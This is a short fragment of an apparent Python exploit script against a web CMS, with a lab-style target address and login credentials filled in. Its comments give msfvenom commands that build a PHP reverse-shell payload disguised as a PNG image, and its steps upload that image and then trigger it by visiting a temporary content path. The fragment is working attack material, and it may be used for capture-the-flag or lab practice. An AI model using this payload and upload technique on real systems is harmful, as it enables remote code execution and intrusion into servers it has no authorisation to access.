...
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil1.png
...
url = 'http://10.129.52.204'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' > evil1.png
# echo -e "<?php $(cat evil1.png)" > evil1.png
payload = 'evil1.png'  # CREATE ME
